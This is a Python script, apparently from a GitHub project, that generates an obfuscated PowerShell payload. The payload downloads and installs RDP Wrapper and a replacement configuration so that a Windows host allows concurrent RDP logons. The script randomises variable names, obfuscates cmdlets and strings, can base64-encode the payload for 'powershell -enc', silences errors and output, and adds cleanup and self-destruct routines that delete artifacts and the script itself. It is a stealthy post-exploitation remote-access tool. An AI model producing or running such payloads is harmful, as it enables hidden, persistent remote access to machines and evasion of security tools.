import argparse
import base64
import random
import string
import sys
import re
import os


#-------------------------Constants-------------------------#

BANNER = """
   ______                                            __       
  / ____/___  ____  _______  _______________  ____  / /_      
 / /   / __ \/ __ \/ ___/ / / / ___/ ___/ _ \/ __ \/ __/      
/ /___/ /_/ / / / / /__/ /_/ / /  / /  /  __/ / / / /_        
\____/\____/_/ /_/\___/\__,_/_/  /_/   \___/_/_/_/\__/_  ____ 
                                            / __ \/ __ \/ __ \\
                                           / /_/ / / / / /_/ /
                                          / _, _/ /_/ / ____/ 
                                         /_/ |_/_____/_/                                                              
"""

PROGRAM_NAME = "Enable-ConcurrentRDP Payload Generator"
VERSION      = "v1.0.0"
AUTHOR       = "wizardy0ga"
GITHUB       = "https://github.com/wizardy0ga/Enable-ConcurrentRDP"

# Color constants
GREEN = '\033[38;2;0;255;0m'
WHITE = '\033[38;2;255;255;255m'
RED   = '\033[38;2;255;0;0m'
TEAL  = '\033[38;2;0;255;255m'
PURP  = '\033[38;2;204;0;204m'
END   = '\033[0m'

# Status boxes
MES_PAY = f'{WHITE}[{GREEN}PAYLOAD{WHITE}]{END}'
MES_INF  = f'{WHITE}[{TEAL}INFO{WHITE}]{END}'
MES_ERR  = f'{WHITE}[{RED}ERROR{WHITE}]{END}'


#-----------------------Standard Output-----------------------#

def print(status: str, color:str, message:str) -> None:
    
    """
    Over-ride print function
    
    @params:
        status:  the status to place within the message
        color:   color of the message to print 
        message: the message to print to stdout
    """

    sys.stdout.write(f'{status} {WHITE}==> {color}{message}{END}\n')


def print_payload(message: str) -> None:
    print(MES_PAY, PURP, message + "\n")


def print_info(message: str) -> None:
    print(MES_INF, TEAL, message) if args.verbose else None


def print_banner() -> None:
    sys.stdout.write(f"{PURP}{BANNER}{END}\n")
    sys.stdout.write(f"{PURP}=" * 70)
    sys.stdout.write(f"\n{GREEN} {PROGRAM_NAME} {VERSION} {WHITE}| Coded by: {RED}{AUTHOR}{END}\n")
    sys.stdout.write(f"      {WHITE}Github: {TEAL}{GITHUB}{END}\n")
    sys.stdout.write(f"{PURP}=" * 70 + "\n\n\n")
    sys.stdout.write(END)


#-----------------------------Obfuscation---------------------------#


def make_var() -> str:
    """returns a random string"""
    return "$" + "".join(random.choices(string.ascii_letters, k=20))


def obfuscate_cmdlet(cmdlet: str) -> str:
    """obfuscates a cmdlet with "" & '' characters"""
    obfuscated_cmdlet = ""
    length            = len(cmdlet)
    for i,char in zip(range(0, length), cmdlet):
        obfuscated_cmdlet += '{0}{1}'.format(char, random.choice(["''", '""'])) if int(i) < (length - 1) else char
    return obfuscated_cmdlet


def obfuscate_string(string: str) -> str:
    """obfuscates a string by typecasting base16 ascii bytes"""
    obfuscated_string = ""
    length            = len(string)
    for i, char in zip(range(0, length), string):
        obfuscated_string += f"[char]([byte]{hex(ord(char))})"
        if int(i) < len(string) - 1:
            obfuscated_string += "+"
    return f"$({obfuscated_string})"


def get_arguments() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Generate a powershell payload that enables concurrent logon sessions for Windows RDP.",
    )
    output      = parser.add_argument_group("Output", "Specify how the payload will be output")
    obfuscation = parser.add_argument_group("Obfuscation", "Set obfuscation of the payload")
    url         = parser.add_argument_group("URLs", "Use alternative URLs for downloading files")
    output.add_argument('-o', '--outfile', help='Name of the payload file', default="./Enable-ConcurrentRDP.ps1", type=str)
    output.add_argument('-p', '--print', help='Print payload to stdout', action='store_true')
    output.add_argument('-v', '--verbose', help='Increase output about the generation of the payload', action='store_true')
    obfuscation.add_argument('-e', '--encode', help='Use base64 encoding', action='store_true')
    obfuscation.add_argument('-n', '--no_output', help='Strip "Write-Host" calls', action='store_true')
    obfuscation.add_argument('-s', '--skip_obf', help='Skip source obfuscation functions', action='store_true')
    output.add_argument('-t', '--tee', help='Print payload to stdout & write to file', action='store_true')
    url.add_argument('-c', '--config', help='Specify alternative configuration URL', type=str, default="https://raw.githubusercontent.com/sebaxakerhtc/rdpwrap.ini/master/rdpwrap.ini")
    url.add_argument('-d', '--dl_path', help='Alternative download URL for RDP Wrapper ZIP archive', default="https://github.com/stascorp/rdpwrap/releases/download/v1.6.2/RDPWrap-v1.6.2.zip")
    return parser.parse_args()


if __name__ == "__main__":

    print_banner()

    args = get_arguments()

    # Create function names
    SELF_DESTURCT   = make_var().strip("$")
    CLEAN_UP        = make_var().strip("$")

    print_info(f'Set {GREEN}Invoke-SelfDestruct{TEAL} to {PURP}{SELF_DESTURCT}{END}')
    print_info(f'Set {GREEN}Invoke-SelfDestruct{TEAL} to {PURP}{SELF_DESTURCT}{END}')

    # Create variable names
    VARIABLES = {
        "RDP_WRAPPER"        : {"name": make_var() if not args.skip_obf else "$RDP_WRAPPER"       , "code": ""},
        "EXTRACT_DEST"       : {"name": make_var() if not args.skip_obf else "$EXTRACT_DEST"      , "code": ""},
        "PROGRAM_FOLDER"     : {"name": make_var() if not args.skip_obf else "$PROGRAM_FOLDER"    , "code": ""},
        "DOWNLOAD_URL"       : {"name": make_var() if not args.skip_obf else "$DOWNLOAD_URL"      , "code": ""},
        "REPLACEMENT_CONFIG" : {"name": make_var() if not args.skip_obf else "$REPLACEMENT_CONFIG", "code": ""},
        "SELF"               : {"name": make_var() if not args.skip_obf else "$SELF"              , "code": ""}
    }
    VARIABLES["RDP_WRAPPER"]["code"] = f"{VARIABLES['RDP_WRAPPER']['name']} = \"C:\Windows\Temp\RDPWrapper.zip\""
    VARIABLES["EXTRACT_DEST"]["code"]  = f"{VARIABLES['EXTRACT_DEST']['name']} = \"C:\Windows\Temp\RDPWrapper\\\""
    VARIABLES["PROGRAM_FOLDER"]["code"]   = f"{VARIABLES['PROGRAM_FOLDER']['name']} = \"C:\Program Files\RDP Wrapper\""
    VARIABLES["DOWNLOAD_URL"]["code"]  = f"{VARIABLES['DOWNLOAD_URL']['name']} = \"{args.dl_path}\""
    VARIABLES["REPLACEMENT_CONFIG"]["code"]    = f"{VARIABLES['REPLACEMENT_CONFIG']['name']} = \"{args.config}\""
    VARIABLES["SELF"]["code"]     = f"{VARIABLES['SELF']['name']} = $MyInvocation.MyCommand.Path"
    REQUEST = make_var()

    for key, value in VARIABLES.items():
        print_info(f"Changed {GREEN}${key}{TEAL} to {PURP}{value['name']}{END}")
    print_info(f"Changed {GREEN}$Response{TEAL} to {PURP}{REQUEST}{END}")

    # Create payload components
    Invoke_SelfDestruct  = f"""function {SELF_DESTURCT} {{Start-Sleep -Seconds 5;Remove-Item -Path {VARIABLES['SELF']['name']} -Force}}"""
    Invoke_CleanUp       = f"""function {CLEAN_UP} {{ Write-Host "[*] Cleaning up file artifacts.";Remove-Item {VARIABLES["RDP_WRAPPER"]["name"]} -Force;Remove-Item {VARIABLES["EXTRACT_DEST"]["name"]} -Force -Recurse;{SELF_DESTURCT}}}"""
    Download_Package     = open("./parts/download").read()
    Enable_RDP           = open("./parts/enable_rdp").read()
    Extract_Execute_Hide = open("./parts/extract").read()
    Download_New_Config  = open("./parts/new_config").read()
    Write_Config         = open("./parts/write_config").read()

    # Merge payload components together
    Components = ["$ErrorActionPreference=\"SilentlyContinue\"",
                  VARIABLES["RDP_WRAPPER"]["code"],
                  VARIABLES["EXTRACT_DEST"]["code"],
                  VARIABLES["PROGRAM_FOLDER"]["code"],
                  VARIABLES["REPLACEMENT_CONFIG"]["code"],
                  VARIABLES["SELF"]["code"],
                  Invoke_SelfDestruct,
                  Invoke_CleanUp,
                  Download_Package,
                  Enable_RDP,
                  Extract_Execute_Hide,
                  Download_New_Config,
                  Write_Config]
    payload = ""
    for component in Components:
        payload += f"{component};"
    
    # Replace variable names
    payload = payload.replace("$RDP_WRAPPER", VARIABLES["RDP_WRAPPER"]["name"])\
                     .replace("$EXTRACT_DEST", VARIABLES["EXTRACT_DEST"]["name"])\
                     .replace("$PROGRAM_FOLDER", VARIABLES["PROGRAM_FOLDER"]["name"])\
                     .replace("$REPLACEMENT_CONFIG", VARIABLES["REPLACEMENT_CONFIG"]["name"])\
                     .replace("$SELF", VARIABLES["SELF"]["name"])\
                     .replace("Invoke-CleanUp", CLEAN_UP)\
                     .replace("Invoke-SelfDestruct", SELF_DESTURCT)\
                     .replace("$Request", REQUEST)

    # Remove Write-Host calls
    if args.no_output:
        payload = re.sub(r'Write-Host\s*("[^"]*")', '', payload)
        payload = re.sub(r'Write-Host \(.+?\)', '', payload)
        print_info("Removed Write-Host calls from payload")

    # Obfuscate strings only if encode is not called. (cmd will be to big to execute). 
    if not args.skip_obf and not args.encode:
        strings = list(set(re.findall(r'["\'](.*?)["\']', payload)))
        for string in strings:
            payload = payload.replace(string, obfuscate_string(string))
        print_info("Obfuscated strings with hexadecimal typecasting") 

    # Obfuscate cmdlets
    if not args.skip_obf:
        Cmdlets = list(set([cmdlet for cmdlet in re.findall(r'\b([a-zA-Z0-9]+-[a-zA-Z0-9]+)\b', payload)\
            if cmdlet not in ["RDPWrap-v1"]]))
        Cmdlets.append(CLEAN_UP)
        Cmdlets.append(SELF_DESTURCT)
        for cmdlet in Cmdlets:
            obfuscated = obfuscate_cmdlet(cmdlet)
            payload    = payload.replace(cmdlet, obfuscated)
            print_info(f"Replaced {GREEN}{cmdlet}{TEAL} with {PURP}{obfuscated}{END}")

    # Encode with base64
    if args.encode:
        payload = "powershell -enc " + base64.b64encode(payload.encode('utf-16le')).decode('ascii')
        print_info("Encoded payload with base64")

    # Print payload
    if args.print or args.tee:
        print_payload(payload)

    # Write payload to disk
    if not args.print or args.tee:
        with open(args.outfile, 'w') as outfile:
            outfile.write(payload)
        print_payload(f"Wrote payload to disk at {GREEN}{os.path.join(os.getcwd(), args.outfile)}{END}")